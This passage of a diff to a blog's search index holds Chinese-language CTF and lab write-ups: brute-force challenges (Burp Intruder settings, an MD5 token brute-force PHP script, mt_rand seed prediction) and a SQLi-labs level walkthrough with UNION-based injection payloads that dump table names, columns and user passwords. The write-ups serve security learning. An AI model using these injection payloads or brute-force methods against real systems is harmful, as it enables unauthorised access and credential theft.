class="number">14</span>,<span class="number">1</span>) ===substr(<span class="variable">$token</span>, <span class="number">17</span>,<span class="number">1</span>))&#123; </span><br><span class="line">            <span class="keyword">if</span>((intval(substr(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>))+intval(substr(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>))+substr(<span class="variable">$token</span>, <span class="number">17</span>,<span class="number">1</span>))/substr(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>)===intval(substr(<span class="variable">$token</span>, <span class="number">31</span>,<span class="number">1</span>)))&#123; </span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$a</span>[<span class="variable">$i</span>].<span class="variable">$a</span>[<span class="variable">$j</span>];</span><br><span class="line">                <span class="keyword">exit</span>(<span class="number">0</span>);</span><br><span class="line">            &#125; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span> </span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-
-<h1 id="WEB24"><a href="#WEB24" class="headerlink" title="WEB24"></a>WEB24</h1><p>这里首先要认识一个函数<a href="https://www.w3school.com.cn/php/func_math_mt_rand.asp">mt_rand() 函数</a>，代码可以<a href="https://c.runoob.com/compile/1/">在线上执行</a></p>
-<p>首先要知道题目中的mt_srand(372619038)是多少</p>
-<p>所以我们运行</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">mt_srand(<span class="number">372619038</span>);</span><br><span class="line"><span class="keyword">echo</span>(mt_rand());</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>得到1155388967所以令r=1155388967，得到flag</p>
-<h1 id="WEB25"><a href="#WEB25" class="headerlink" title="WEB25"></a>WEB25</h1><p>有点复杂呜呜呜，留给“明天”吧</p>
-<h1 id="WEB26"><a href="#WEB26" class="headerlink" title="WEB26"></a>WEB26</h1><p>查看源码发现js，直接进入代码中的checkdb.php，然后直接post提交（原理不太清楚）</p>
-<p><img src="/2022/02/14/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-4/image-20220217200641171.png" alt="image-20220217200641171"></p>
-<p>得到flag</p>
-<h1 id="WEB27"><a href="#WEB27" class="headerlink" title="WEB27"></a>WEB27</h1><p>这里是爆破身份证号中的生日，设置如下，如果线程太多的话，很可能出现503报错，导致爆破结果不准确</p>
-<p><img src="/2022/02/14/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-4/image-20220217203239020.png" alt="image-20220217203239020"></p>
-<p><img src="/2022/02/14/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-4/image-20220217204616803.png" alt="image-20220217204616803"></p>
-<p>得出结果后，Unicode解码后用学号登入，得到flag</p>
-<h1 id="WEB28"><a href="#WEB28" class="headerlink" title="WEB28"></a>WEB28</h1><p>看到url中诡异的0/1则用集束炸弹爆破这两个地方，最后得到flag</p>
-<p><img src="/2022/02/14/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-4/image-20220217205359730.png" alt="image-20220217205359730"></p>
+<p>首先判断闭合方式</p>
+<p><code>?id=1&#39;</code></p>
+<p><code>?id=1&quot;</code></p>
+<p>**1.**如果都报错，就是整型</p>
+<p>**2.**如果单引号报错，双引号不报错，尝试</p>
+<p><code>?id=1&#39;--+</code></p>
+<p>如果不报错就是单引号闭合，报错就是单引号加括号闭合</p>
+<p>**3.**如果单引号不报错，双引号报错，尝试</p>
+<p><code>id=1&quot;--+</code></p>
+<p>无报错则双引号闭合，报错则双引号加括号闭合</p>
+<p><strong>任何闭合方式在没有遇到相对应的闭合时，都会把这个符号当做一个整体，注释符也没用！！</strong></p>
+<p>单引号</p>
+<p><img src="/2022/01/22/sqlilabs%E7%AC%AC%E4%B8%89%E5%85%B3/image-20220122200408676.png" alt="image-20220122200408676"></p>
+<p>双引号</p>
+<p><img src="/2022/01/22/sqlilabs%E7%AC%AC%E4%B8%89%E5%85%B3/image-20220122200430772.png" alt="image-20220122200430772"></p>
+<p>尝试?<code>id=1&#39;--+</code></p>
+<p><img src="/2022/01/22/sqlilabs%E7%AC%AC%E4%B8%89%E5%85%B3/image-20220122200511915.png" alt="image-20220122200511915"></p>
+<p>则可判断闭合方式是<strong>单引号加括号</strong></p>
+<p>其余与第一关就一样了</p>
+<p>判断字段数、回显点、暴库名就舍去了</p>
+<p>爆表名</p>
+<p><code>?id=-1&#39;) union select 1,group_concat(table_name),3 from information_schema.tables where table_schema =&#39;security&#39;--+</code></p>
+<p>爆字段名</p>
+<p><code>?id=-1&#39;) union select 1,group_concat(column_name),3 from information_schema.columns where table_schema =&#39;security&#39; and table_name=&#39;users&#39;--+</code></p>
+<p>查数据</p>
+<p><code>?id=-1&#39;) union select 1,group_concat(username,1,password),3 from security.users--+</code></p>
+<p>完成</p>
 ]]></content>
       <tags>
-        <tag>刷题</tag>
+        <tag>SQL</tag>
       </tags>
   </entry>
   <entry>
@@ -2663,6 +2650,46 @@
 
 <p> .php 因为前面的php语句已经闭合了，所以后面的.php会被当成html页面直接显示在页面上，起不到什么作用</p>
 <p>payload和WEB37一样</p>
+]]></content>
+      <tags>
+        <tag>刷题</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>刷题记录-4（爆破）</title>
+    <url>/2022/02/14/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-4/</url>
+    <content><![CDATA[<h1 id="WEB21"><a href="#WEB21" class="headerlink" title="WEB21"></a>WEB21</h1><p>这道题有点意思，不只是单纯的爆破，还进行了base64加密，首先下载给的字典。然后用字典进行爆破，爆破时要用custom iterator（自定义迭代器），然后通过base64解码得知格式为 <code>用户名:密码</code>攻击类型为Sniper</p>
+<p>设置如下</p>
+<span id="more"></span>
+
+<p><img src="/2022/02/14/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-4/image-20220217175309858.png" alt="image-20220217175309858"></p>
+<p>这里的admin只是猜测，没想到真能搞出来</p>
+<p><img src="/2022/02/14/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-4/image-20220217175341802.png" alt="image-20220217175341802"></p>
+<p><img src="/2022/02/14/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-4/image-20220217175430654.png" alt="image-20220217175430654"></p>
+<p><img src="/2022/02/14/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-4/image-20220217180350198.png" alt="image-20220217180350198"></p>
+<p>最终得到flag</p>
+<h1 id="WEB22"><a href="#WEB22" class="headerlink" title="WEB22"></a>WEB22</h1><p>爆破子域名，这个还真不会，但是这个<a href="http://z.zcjun.com/?http=baidu.com">在线爆破子域名</a>可还行</p>
+<h1 id="WEB23"><a href="#WEB23" class="headerlink" title="WEB23"></a>WEB23</h1><p>呜呜呜，这个也不会，等着以后学了php再回来搞，码子先放这了</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line"> </span><br><span class="line"><span class="variable">$a</span>=<span class="string">&quot;asdfghjklqwertyuiopzxcvbnm1234567890&quot;</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="number">36</span>;<span class="variable">$i</span>++)&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$j</span>=<span class="number">0</span>;<span class="variable">$j</span>&lt;<span class="number">36</span>;<span class="variable">$j</span>++)&#123;</span><br><span class="line">        <span class="variable">$token</span>=<span class="variable">$a</span>[<span class="variable">$i</span>].<span class="variable">$a</span>[<span class="variable">$j</span>];    </span><br><span class="line">        <span class="variable">$token</span> = md5(<span class="variable">$token</span>); </span><br><span class="line">        <span class="keyword">if</span>(substr(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>)===substr(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>) &amp;&amp; substr(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>) ===substr(<span class="variable">$token</span>, <span class="number">17</span>,<span class="number">1</span>))&#123; </span><br><span class="line">            <span class="keyword">if</span>((intval(substr(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>))+intval(substr(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>))+substr(<span class="variable">$token</span>, <span class="number">17</span>,<span class="number">1</span>))/substr(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>)===intval(substr(<span class="variable">$token</span>, <span class="number">31</span>,<span class="number">1</span>)))&#123; </span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$a</span>[<span class="variable">$i</span>].<span class="variable">$a</span>[<span class="variable">$j</span>];</span><br><span class="line">                <span class="keyword">exit</span>(<span class="number">0</span>);</span><br><span class="line">            &#125; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span> </span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="WEB24"><a href="#WEB24" class="headerlink" title="WEB24"></a>WEB24</h1><p>这里首先要认识一个函数<a href="https://www.w3school.com.cn/php/func_math_mt_rand.asp">mt_rand() 函数</a>，代码可以<a href="https://c.runoob.com/compile/1/">在线上执行</a></p>
+<p>首先要知道题目中的mt_srand(372619038)是多少</p>
+<p>所以我们运行</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">mt_srand(<span class="number">372619038</span>);</span><br><span class="line"><span class="keyword">echo</span>(mt_rand());</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>得到1155388967所以令r=1155388967，得到flag</p>
+<h1 id="WEB25"><a href="#WEB25" class="headerlink" title="WEB25"></a>WEB25</h1><p>有点复杂呜呜呜，留给“明天”吧</p>
+<h1 id="WEB26"><a href="#WEB26" class="headerlink" title="WEB26"></a>WEB26</h1><p>查看源码发现js，直接进入代码中的checkdb.php，然后直接post提交（原理不太清楚）</p>
+<p><img src="/2022/02/14/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-4/image-20220217200641171.png" alt="image-20220217200641171"></p>
+<p>得到flag</p>
+<h1 id="WEB27"><a href="#WEB27" class="headerlink" title="WEB27"></a>WEB27</h1><p>这里是爆破身份证号中的生日，设置如下，如果线程太多的话，很可能出现503报错，导致爆破结果不准确</p>
+<p><img src="/2022/02/14/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-4/image-20220217203239020.png" alt="image-20220217203239020"></p>
+<p><img src="/2022/02/14/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-4/image-20220217204616803.png" alt="image-20220217204616803"></p>
+<p>得出结果后，Unicode解码后用学号登入，得到flag</p>
+<h1 id="WEB28"><a href="#WEB28" class="headerlink" title="WEB28"></a>WEB28</h1><p>看到url中诡异的0/1则用集束炸弹爆破这两个地方，最后得到flag</p>
+<p><img src="/2022/02/14/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-4/image-20220217205359730.png" alt="image-20220217205359730"></p>
 ]]></content>
       <tags>
         <tag>刷题</tag>
